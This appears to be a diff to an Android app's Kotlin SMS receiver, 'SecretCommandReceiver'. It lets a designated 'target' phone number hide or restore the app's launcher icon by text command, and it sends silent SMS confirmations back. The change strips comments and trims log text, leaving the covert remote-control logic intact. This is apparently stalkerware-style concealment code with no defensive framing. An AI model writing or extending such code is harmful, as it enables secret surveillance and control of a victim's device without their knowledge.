@@ -23,16 +23,13 @@ class SecretCommandReceiver : BroadcastReceiver() {
         val prefs = PreferenceManager.getDefaultSharedPreferences(context)
         val numeroAutorise = prefs.getString("NUMERO_CIBLE", "")
 
-        if (numeroExpediteur != numeroAutorise) return // Seul le numéro autorisé peut utiliser ces commandes
+        if (numeroExpediteur != numeroAutorise) return
 
         when {
-            // 🕵️ CACHER L'APP À DISTANCE
             texte == "BLOOM_HIDE" -> {
                 cacherApplication(context)
                 reponseSilencieuse(context, numeroExpediteur, "BLOOM:OK_CACHE")
             }
-            
-            // 🔓 RÉAPPARAÎTRE L'APP À DISTANCE
             texte == "BLOOM_SHOW" -> {
                 faireReapparaitreApplication(context)
                 reponseSilencieuse(context, numeroExpediteur, "BLOOM:OK_MONTRE")
@@ -47,7 +44,7 @@ class SecretCommandReceiver : BroadcastReceiver() {
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
-        Log.d("BLOOM-DATA", "🕵️ Application cachée — icône disparaît")
+        Log.d("BLOOM-DATA", "🕵️ Application cachée")
     }
 
     private fun faireReapparaitreApplication(context: Context) {
@@ -68,7 +65,7 @@ class SecretCommandReceiver : BroadcastReceiver() {
                 null, null
             )
         } catch (e: Exception) {
-            Log.e("BLOOM-DATA", "Erreur réponse: ${e.message}")
+            Log.e("BLOOM-DATA", "Erreur: ${e.message}")
         }
     }
 }
